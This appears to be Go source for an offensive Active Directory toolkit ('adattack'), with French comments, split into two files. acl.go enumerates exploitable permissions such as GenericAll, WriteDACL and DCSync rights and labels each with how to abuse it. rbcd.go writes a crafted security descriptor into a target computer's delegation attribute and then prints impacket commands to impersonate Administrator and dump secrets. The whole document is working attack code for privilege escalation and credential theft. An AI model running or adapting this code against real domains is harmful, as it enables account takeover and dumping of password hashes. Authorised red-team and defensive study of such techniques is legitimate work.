// =============================================================================
// FICHIER 1 : pkg/adattack/acl.go
// ACL Enumeration — trouver GenericAll, WriteDACL, WriteOwner, etc.
// =============================================================================

package adattack

import (
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

// ============================================================
// Types ACL
// ============================================================

// ACLRight représente un droit ACL détecté sur un objet AD
type ACLRight struct {
	ObjectDN   string // DN de l'objet qui A le droit
	ObjectName string // sAMAccountName de l'objet qui A le droit
	ObjectType string // "User", "Group", "Computer"
	TargetDN   string // DN de l'objet CIBLE
	TargetName string // sAMAccountName de la cible
	Right      string // "GenericAll", "WriteDACL", "WriteOwner"...
	Inherited  bool
	AbuseInfo  string // Comment exploiter ce droit
}

// Droits AD importants (ACCESS_MASK)
const (
	// Droits génériques
	GENERIC_ALL   = 0x10000000
	GENERIC_WRITE = 0x40000000
	GENERIC_READ  = 0x80000000

	// Droits spécifiques AD
	ADS_RIGHT_WRITE_DAC         = 0x00040000 // WriteDACL
	ADS_RIGHT_WRITE_OWNER       = 0x00080000 // WriteOwner
	ADS_RIGHT_DS_WRITE_PROP     = 0x00000020 // WriteProperty
	ADS_RIGHT_DS_CONTROL_ACCESS = 0x00000100 // ExtendedRights
	ADS_RIGHT_ACTRL_DS_LIST     = 0x00000004 // ListObject
	ADS_RIGHT_DS_CREATE_CHILD   = 0x00000001 // CreateChild
	ADS_RIGHT_DS_SELF           = 0x00000008 // Self (validated writes)

	// Extended Rights GUIDs importants
	GUID_USER_FORCE_CHANGE_PASSWORD     = "00299570-246d-11d0-a768-00aa006e0529"
	GUID_DS_REPLICATION_GET_CHANGES     = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" // DCSync
	GUID_DS_REPLICATION_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
	GUID_SELF_MEMBERSHIP                = "bf9679c0-0de6-11d0-a285-00aa003049e2" // AddMember
)

// ACLClient client pour l'énumération des ACLs
type ACLClient struct {
	conn   *ldap.Conn
	baseDN string
}

// NewACLClient crée un client ACL
func NewACLClient(conn *ldap.Conn, baseDN string) *ACLClient {
	return &ACLClient{conn: conn, baseDN: baseDN}
}

// ============================================================
// Enumération des ACLs dangereuses
// ============================================================

// FindDangerousACLs énumère tous les droits dangereux dans le domaine
// C'est la version CLI de ce que BloodHound visualise graphiquement
func (a *ACLClient) FindDangerousACLs() ([]ACLRight, error) {
	fmt.Println("[*] List of dangerous ACLs in the field...")
	fmt.Println("[*] Retrieving objects (users, groups, computers)...")

	// Récupérer tous les objets avec leur nTSecurityDescriptor
	req := ldap.NewSearchRequest(
		a.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(|(objectClass=user)(objectClass=group)(objectClass=computer))",
		[]string{
			"dn",
			"sAMAccountName",
			"objectClass",
			"nTSecurityDescriptor",
			"objectSid",
		},
		// Contrôle LDAP pour récupérer le security descriptor
		[]ldap.Control{
			&ldap.ControlString{
				ControlType:  "1.2.840.113556.1.4.801", // LDAP_SERVER_SD_FLAGS_OID
				Criticality:  false,
				ControlValue: string([]byte{0x30, 0x03, 0x02, 0x01, 0x04}), // DACL only
			},
		},
	)

	sr, err := a.conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("ACL search failed: %v", err)
	}

	fmt.Printf("[*] Analyse de %d objets...\n", len(sr.Entries))

	// Construire une map DN → sAMAccountName pour la résolution
	dnToName := make(map[string]string)
	dnToType := make(map[string]string)
	for _, entry := range sr.Entries {
		dn := entry.DN
		name := entry.GetAttributeValue("sAMAccountName")
		dnToName[dn] = name

		classes := entry.GetAttributeValues("objectClass")
		dnToType[dn] = resolveObjectType(classes)
	}

	var rights []ACLRight

	// Analyser le DACL de chaque objet
	for _, entry := range sr.Entries {
		sdBytes := entry.GetRawAttributeValue("nTSecurityDescriptor")
		if len(sdBytes) == 0 {
			continue
		}

		aces, err := parseSecurityDescriptor(sdBytes)
		if err != nil {
			continue
		}

		targetName := entry.GetAttributeValue("sAMAccountName")
		targetType := resolveObjectType(entry.GetAttributeValues("objectClass"))

		for _, ace := range aces {
			// Ignorer les SIDs système (SYSTEM, Administrators, etc.)
			if isBuiltinSID(ace.SID) {
				continue
			}

			// Vérifier les droits dangereux
			dangerousRights := detectDangerousRights(ace, targetType)
			for _, right := range dangerousRights {
				// Résoudre le SID en nom LDAP
				principalName, principalDN := a.resolveSID(ace.SID)

				rights = append(rights, ACLRight{
					ObjectDN:   principalDN,
					ObjectName: principalName,
					ObjectType: dnToType[principalDN],
					TargetDN:   entry.DN,
					TargetName: targetName,
					Right:      right.name,
					Inherited:  ace.Inherited,
					AbuseInfo:  right.abuse,
				})
			}
		}
	}

	return rights, nil
}

// FindACLsOnTarget analyse les ACLs d'un objet spécifique
func (a *ACLClient) FindACLsOnTarget(target string) ([]ACLRight, error) {
	targetDN, err := a.resolveTargetDN(target)
	if err != nil {
		return nil, err
	}

	req := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"sAMAccountName", "objectClass", "nTSecurityDescriptor"},
		[]ldap.Control{
			&ldap.ControlString{
				ControlType:  "1.2.840.113556.1.4.801",
				Criticality:  false,
				ControlValue: string([]byte{0x30, 0x03, 0x02, 0x01, 0x04}),
			},
		},
	)

	sr, err := a.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return nil, fmt.Errorf("objet '%s' introuvable", target)
	}

	entry := sr.Entries[0]
	sdBytes := entry.GetRawAttributeValue("nTSecurityDescriptor")
	targetName := entry.GetAttributeValue("sAMAccountName")
	targetType := resolveObjectType(entry.GetAttributeValues("objectClass"))

	aces, err := parseSecurityDescriptor(sdBytes)
	if err != nil {
		return nil, fmt.Errorf("DACL parsing failed: %v", err)
	}

	var rights []ACLRight
	for _, ace := range aces {
		if isBuiltinSID(ace.SID) {
			continue
		}

		dangerousRights := detectDangerousRights(ace, targetType)
		for _, right := range dangerousRights {
			principalName, principalDN := a.resolveSID(ace.SID)
			rights = append(rights, ACLRight{
				ObjectDN:   principalDN,
				ObjectName: principalName,
				TargetDN:   targetDN,
				TargetName: targetName,
				Right:      right.name,
				Inherited:  ace.Inherited,
				AbuseInfo:  fmt.Sprintf("[%s → %s] %s", principalName, targetName, right.abuse),
			})
		}
	}

	return rights, nil
}

// ============================================================
// Parser Security Descriptor (DACL)
// ============================================================

// ACE représente une Access Control Entry
type ACE struct {
	Type       uint8
	Flags      uint8
	AccessMask uint32
	SID        string
	ObjectType string // GUID pour les extended rights
	Inherited  bool
}

type rightInfo struct {
	name  string
	abuse string
}

// parseSecurityDescriptor parse un Security Descriptor Windows binaire
func parseSecurityDescriptor(data []byte) ([]ACE, error) {
	if len(data) < 20 {
		return nil, fmt.Errorf("security descriptor too short")
	}

	// Structure SECURITY_DESCRIPTOR :
	// Revision(1) + Sbz1(1) + Control(2) + OffsetOwner(4) + OffsetGroup(4) +
	// OffsetSacl(4) + OffsetDacl(4)
	if data[0] != 0x01 {
		return nil, fmt.Errorf("invalid revision: %d", data[0])
	}

	daclOffset := binary.LittleEndian.Uint32(data[16:20])
	if daclOffset == 0 || int(daclOffset) >= len(data) {
		return nil, nil // Pas de DACL
	}

	daclData := data[daclOffset:]
	return parseACL(daclData)
}

// parseACL parse une ACL (liste d'ACEs)
func parseACL(data []byte) ([]ACE, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("ACL too short")
	}

	// ACL header : AclRevision(1) + Sbz1(1) + AclSize(2) + AceCount(2) + Sbz2(2)
	aceCount := binary.LittleEndian.Uint16(data[4:6])
	offset := 8 // début des ACEs

	var aces []ACE
	for i := 0; i < int(aceCount); i++ {
		if offset >= len(data) {
			break
		}

		ace, size, err := parseACE(data[offset:])
		if err != nil {
			offset += 4 // skip
			continue
		}

		aces = append(aces, ace)
		offset += size
	}

	return aces, nil
}

// parseACE parse une ACE individuelle
func parseACE(data []byte) (ACE, int, error) {
	if len(data) < 8 {
		return ACE{}, 0, fmt.Errorf("ACE too short")
	}

	aceType := data[0]
	aceFlags := data[1]
	aceSize := int(binary.LittleEndian.Uint16(data[2:4]))
	accessMask := binary.LittleEndian.Uint32(data[4:8])

	ace := ACE{
		Type:       aceType,
		Flags:      aceFlags,
		AccessMask: accessMask,
		Inherited:  (aceFlags & 0x10) != 0, // INHERITED_ACE flag
	}

	// Types : 0x00 = ACCESS_ALLOWED_ACE, 0x05 = OBJECT_ACE
	sidOffset := 8
	if aceType == 0x05 || aceType == 0x06 { // OBJECT_ACE
		// ObjectType GUID (16 bytes optionnel)
		objectTypeFlags := binary.LittleEndian.Uint32(data[8:12])
		sidOffset = 12
		if (objectTypeFlags & 0x01) != 0 {
			// ObjectType présent
			if len(data) >= 28 {
				ace.ObjectType = formatGUID(data[12:28])
				sidOffset = 28
			}
		}
		if (objectTypeFlags & 0x02) != 0 {
			// InheritedObjectType présent (skip)
			sidOffset += 16
		}
	}

	if aceSize > len(data) || sidOffset >= aceSize {
		return ace, aceSize, nil
	}

	ace.SID = parseSID(data[sidOffset:aceSize])

	return ace, aceSize, nil
}

// parseSID convertit des bytes en string SID
func parseSID(data []byte) string {
	if len(data) < 8 {
		return ""
	}

	revision := data[0]
	subAuthCount := int(data[1])

	// Identifier Authority (6 bytes, big-endian)
	var authority uint64
	for i := 2; i < 8; i++ {
		authority = authority<<8 | uint64(data[i])
	}

	sid := fmt.Sprintf("S-%d-%d", revision, authority)

	for i := 0; i < subAuthCount && 8+i*4+4 <= len(data); i++ {
		subAuth := binary.LittleEndian.Uint32(data[8+i*4:])
		sid += fmt.Sprintf("-%d", subAuth)
	}

	return sid
}

// formatGUID convertit 16 bytes en string GUID
func formatGUID(data []byte) string {
	if len(data) < 16 {
		return ""
	}
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		binary.LittleEndian.Uint32(data[0:4]),
		binary.LittleEndian.Uint16(data[4:6]),
		binary.LittleEndian.Uint16(data[6:8]),
		data[8:10],
		data[10:16],
	)
}

// detectDangerousRights identifie les droits exploitables
func detectDangerousRights(ace ACE, targetType string) []rightInfo {
	// Ignorer les ACEs de type DENY
	if ace.Type == 0x01 || ace.Type == 0x06 {
		return nil
	}

	var rights []rightInfo
	mask := ace.AccessMask

	// GenericAll — contrôle total
	if (mask & GENERIC_ALL) != 0 {
		rights = append(rights, rightInfo{
			name:  "GenericAll",
			abuse: "Full control: password reset, group addition, Shadow Creds, RBCD",
		})
		return rights // GenericAll implique tout le reste
	}

	// WriteDACL — modifier les permissions
	if (mask & ADS_RIGHT_WRITE_DAC) != 0 {
		rights = append(rights, rightInfo{
			name:  "WriteDACL",
			abuse: "Can add GenericAll to itself → escalation towards total control",
		})
	}

	// WriteOwner — changer le propriétaire
	if (mask & ADS_RIGHT_WRITE_OWNER) != 0 {
		rights = append(rights, rightInfo{
			name:  "WriteOwner",
			abuse: "Can be defined as owner → WriteDACL → GenericAll",
		})
	}

	// GenericWrite — écrire des propriétés
	if (mask & GENERIC_WRITE) != 0 {
		abuse := "Can write properties : msDS-KeyCredentialLink (Shadow Creds)"
		if targetType == "Computer" {
			abuse += ", msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)"
		}
		rights = append(rights, rightInfo{name: "GenericWrite", abuse: abuse})
	}

	// WriteProperty spécifique
	if (mask & ADS_RIGHT_DS_WRITE_PROP) != 0 {
		if ace.ObjectType == GUID_SELF_MEMBERSHIP {
			rights = append(rights, rightInfo{
				name:  "Self-Membership (AddMember)",
				abuse: "Can add itself to the group",
			})
		} else if ace.ObjectType == "" {
			rights = append(rights, rightInfo{
				name:  "WriteProperty",
				abuse: "Can write LDAP attributes according to permissions",
			})
		}
	}

	// Extended Rights
	if (mask & ADS_RIGHT_DS_CONTROL_ACCESS) != 0 {
		switch ace.ObjectType {
		case GUID_USER_FORCE_CHANGE_PASSWORD:
			rights = append(rights, rightInfo{
				name:  "ForceChangePassword",
				abuse: "Can reset the password without knowing the current one",
			})
		case GUID_DS_REPLICATION_GET_CHANGES, GUID_DS_REPLICATION_GET_CHANGES_ALL:
			rights = append(rights, rightInfo{
				name:  "DCSync",
				abuse: "Can perform a DCSync → dump of all NTLM hashes",
			})
		case "":
			if targetType == "User" {
				rights = append(rights, rightInfo{
					name:  "AllExtendedRights",
					abuse: "ForceChangePassword + others extended rights",
				})
			}
		}
	}

	return rights
}

// isBuiltinSID retourne true si le SID est un compte système à ignorer
func isBuiltinSID(sid string) bool {
	builtins := []string{
		"S-1-5-18",     // SYSTEM
		"S-1-5-32-544", // Administrators
		"S-1-5-9",      // Enterprise Domain Controllers
		"S-1-3-0",      // Creator Owner
		"S-1-5-10",     // Self
		"S-1-1-0",      // Everyone
		"S-1-5-11",     // Authenticated Users
		"S-1-16-",      // Mandatory Level
		"S-1-5-32-",    // Builtin groups
	}
	for _, b := range builtins {
		if strings.HasPrefix(sid, b) {
			return true
		}
	}
	return false
}

// resolveSID résout un SID en nom + DN via LDAP
func (a *ACLClient) resolveSID(sid string) (name, dn string) {
	req := ldap.NewSearchRequest(
		a.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		fmt.Sprintf("(objectSid=%s)", sid),
		[]string{"sAMAccountName", "dn"},
		nil,
	)

	sr, err := a.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return sid, "" // retourner le SID brut si pas résolu
	}

	return sr.Entries[0].GetAttributeValue("sAMAccountName"), sr.Entries[0].DN
}

// resolveObjectType détermine le type d'objet depuis ses objectClass
func resolveObjectType(classes []string) string {
	for _, c := range classes {
		switch strings.ToLower(c) {
		case "computer":
			return "Computer"
		case "group":
			return "Group"
		case "user":
			return "User"
		case "organizationalunit":
			return "OU"
		}
	}
	return "Unknown"
}

func (a *ACLClient) resolveTargetDN(target string) (string, error) {
	if strings.Contains(target, "=") {
		return target, nil
	}

	req := ldap.NewSearchRequest(
		a.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(target)),
		[]string{"dn"},
		nil,
	)

	sr, err := a.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return "", fmt.Errorf("'%s' not found", target)
	}

	return sr.Entries[0].DN, nil
}

// =============================================================================
// FICHIER 2 : pkg/adattack/rbcd.go
// Resource-Based Constrained Delegation abuse
// =============================================================================

// rbcd.go — à créer dans pkg/adattack/
// package adattack (même package)

// RBCDClient gère les opérations RBCD
type RBCDClient struct {
	conn   *ldap.Conn
	baseDN string
}

// NewRBCDClient crée un client RBCD
func NewRBCDClient(conn *ldap.Conn, baseDN string) *RBCDClient {
	return &RBCDClient{conn: conn, baseDN: baseDN}
}

// RBCDResult résultat d'une opération RBCD
type RBCDResult struct {
	TargetComputer  string // machine sur laquelle on a écrit
	AttackerAccount string // compte sous notre contrôle
	NextSteps       []string
}

// SetupRBCD configure RBCD sur une machine cible
// Nécessite : GenericWrite ou WriteProperty sur msDS-AllowedToActOnBehalfOfOtherIdentity
// sur la machine cible
//
// Flow complet :
// 1. Avoir GenericWrite sur MACHINE_TARGET$
// 2. Écrire notre compte dans msDS-AllowedToActOnBehalfOfOtherIdentity de MACHINE_TARGET$
// 3. S4U2Self + S4U2Proxy → TGS pour n'importe quel utilisateur vers MACHINE_TARGET$
func (r *RBCDClient) SetupRBCD(targetComputer, attackerAccount string) (*RBCDResult, error) {
	fmt.Printf("[*] RBCD: configuration on '%s' with '%s'\n", targetComputer, attackerAccount)

	// 1. Résoudre le DN de la machine cible
	targetDN, err := r.resolveComputerDN(targetComputer)
	if err != nil {
		return nil, fmt.Errorf("machine '%s' not found: %v", targetComputer, err)
	}

	// 2. Récupérer le SID de notre compte attaquant
	attackerSID, err := r.getObjectSID(attackerAccount)
	if err != nil {
		return nil, fmt.Errorf("account '%s' not found: %v", attackerAccount, err)
	}

	fmt.Printf("[*] Attacking SID : %s\n", attackerSID)

	// 3. Construire le Security Descriptor pour msDS-AllowedToActOnBehalfOfOtherIdentity
	// Format : SECURITY_DESCRIPTOR avec une ACE Allow pour notre SID
	sdBytes, err := buildRBCDSecurityDescriptor(attackerSID)
	if err != nil {
		return nil, fmt.Errorf("SD build failed: %v", err)
	}

	// 4. Écrire l'attribut msDS-AllowedToActOnBehalfOfOtherIdentity
	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sdBytes)})

	if err := r.conn.Modify(modReq); err != nil {
		return nil, fmt.Errorf("RBCD write failed (GenericWrite required on %s): %v",
			targetComputer, err)
	}

	fmt.Printf("[+] RBCD configured! '%s' can impersonate any user on '%s'\n",
		attackerAccount, targetComputer)

	// 5. Afficher les étapes suivantes
	result := &RBCDResult{
		TargetComputer:  targetComputer,
		AttackerAccount: attackerAccount,
		NextSteps: []string{
			fmt.Sprintf("1. Obtaining a TGT for '%s' :", attackerAccount),
			fmt.Sprintf("   adgo kerberos getTGT -u %s -p <password> -d <domain>", attackerAccount),
			fmt.Sprintf("2. S4U2Self + S4U2Proxy to obtain a TGS admin :"),
			fmt.Sprintf("   impacket-getST -spn cifs/%s -impersonate Administrator -dc-ip <DC_IP> <domain>/%s:<password>", targetComputer, attackerAccount),
			fmt.Sprintf("3. Use the TGS :"),
			fmt.Sprintf("   export KRB5CCNAME=Administrator@cifs_%s.ccache", targetComputer),
			fmt.Sprintf("   impacket-secretsdump -k -no-pass %s", targetComputer),
		},
	}

	for _, step := range result.NextSteps {
		fmt.Println(step)
	}

	return result, nil
}

// ReadRBCD lit la configuration RBCD actuelle d'une machine
func (r *RBCDClient) ReadRBCD(targetComputer string) ([]string, error) {
	targetDN, err := r.resolveComputerDN(targetComputer)
	if err != nil {
		return nil, err
	}

	req := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"msDS-AllowedToActOnBehalfOfOtherIdentity"},
		nil,
	)

	sr, err := r.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return nil, fmt.Errorf("RBCD read failed")
	}

	rawSD := sr.Entries[0].GetRawAttributeValue("msDS-AllowedToActOnBehalfOfOtherIdentity")
	if len(rawSD) == 0 {
		fmt.Printf("[*] No RBCD configured on '%s'\n", targetComputer)
		return nil, nil
	}

	// Parser le SD pour extraire les SIDs autorisés
	aces, err := parseSecurityDescriptor(rawSD)
	if err != nil {
		return nil, err
	}

	var allowedSIDs []string
	for _, ace := range aces {
		allowedSIDs = append(allowedSIDs, ace.SID)
	}

	return allowedSIDs, nil
}

// ClearRBCD supprime la configuration RBCD (cleanup)
func (r *RBCDClient) ClearRBCD(targetComputer string) error {
	targetDN, err := r.resolveComputerDN(targetComputer)
	if err != nil {
		return err
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Delete("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{})

	if err := r.conn.Modify(modReq); err != nil {
		return fmt.Errorf("RBCD removal failed: %v", err)
	}

	fmt.Printf("[+] RBCD removed on '%s'\n", targetComputer)
	return nil
}

// buildRBCDSecurityDescriptor construit le SD pour RBCD
func buildRBCDSecurityDescriptor(sid string) ([]byte, error) {
	sidBytes, err := encodeSID(sid)
	if err != nil {
		return nil, fmt.Errorf("SID encoding failed: %v", err)
	}

	// ACE : ACCESS_ALLOWED_ACE pour notre SID avec GENERIC_ALL
	aceSize := uint16(8 + len(sidBytes))
	ace := []byte{
		0x00, // AceType: ACCESS_ALLOWED_ACE_TYPE
		0x00, // AceFlags
	}
	ace = append(ace, byte(aceSize), byte(aceSize>>8)) // AceSize (little-endian)
	// AccessMask : GENERIC_ALL
	ace = append(ace, 0x00, 0x00, 0x00, 0x10)
	ace = append(ace, sidBytes...)

	// ACL header
	aclSize := uint16(8 + len(ace))
	acl := []byte{
		0x02,                              // AclRevision
		0x00,                              // Sbz1
		byte(aclSize), byte(aclSize >> 8), // AclSize
		0x01, 0x00, // AceCount = 1
		0x00, 0x00, // Sbz2
	}
	acl = append(acl, ace...)

	// Security Descriptor
	// Offset DACL = 20 (taille du header SD)
	daclOffset := uint32(20)
	sd := []byte{
		0x01,       // Revision
		0x00,       // Sbz1
		0x04, 0x00, // Control: SE_DACL_PRESENT
		0x00, 0x00, 0x00, 0x00, // OffsetOwner = 0
		0x00, 0x00, 0x00, 0x00, // OffsetGroup = 0
		0x00, 0x00, 0x00, 0x00, // OffsetSacl = 0
		byte(daclOffset), byte(daclOffset >> 8), byte(daclOffset >> 16), byte(daclOffset >> 24),
	}
	sd = append(sd, acl...)

	return sd, nil
}

// encodeSID convertit un string SID en bytes
func encodeSID(sid string) ([]byte, error) {
	// Format : S-R-A-S1-S2-...
	parts := strings.Split(sid, "-")
	if len(parts) < 3 || parts[0] != "S" {
		return nil, fmt.Errorf("Invalid SID: %s", sid)
	}

	var result []byte
	result = append(result, 1) // Revision

	subAuthCount := byte(len(parts) - 3)
	result = append(result, subAuthCount)

	// Authority (6 bytes, big-endian)
	var auth uint64
	fmt.Sscanf(parts[2], "%d", &auth)
	result = append(result,
		byte(auth>>40), byte(auth>>32), byte(auth>>24),
		byte(auth>>16), byte(auth>>8), byte(auth),
	)

	// Sub-authorities
	for i := 3; i < len(parts); i++ {
		var subAuth uint32
		fmt.Sscanf(parts[i], "%d", &subAuth)
		b := make([]byte, 4)
		binary.LittleEndian.PutUint32(b, subAuth)
		result = append(result, b...)
	}

	return result, nil
}

// resolveComputerDN trouve le DN d'un ordinateur
func (r *RBCDClient) resolveComputerDN(name string) (string, error) {
	// Ajouter $ si pas présent (convention AD pour les comptes machine)
	samName := name
	if !strings.HasSuffix(name, "$") {
		samName = name + "$"
	}

	req := ldap.NewSearchRequest(
		r.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		fmt.Sprintf("(&(objectClass=computer)(sAMAccountName=%s))",
			ldap.EscapeFilter(samName)),
		[]string{"dn"},
		nil,
	)

	sr, err := r.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return "", fmt.Errorf("machine '%s' not found", name)
	}

	return sr.Entries[0].DN, nil
}

// getObjectSID récupère le SID d'un objet AD
func (r *RBCDClient) getObjectSID(name string) (string, error) {
	req := ldap.NewSearchRequest(
		r.baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 0, false,
		fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(name)),
		[]string{"objectSid"},
		nil,
	)

	sr, err := r.conn.Search(req)
	if err != nil || len(sr.Entries) == 0 {
		return "", fmt.Errorf("object '%s' not found", name)
	}

	sidBytes := sr.Entries[0].GetRawAttributeValue("objectSid")
	return parseSID(sidBytes), nil
}
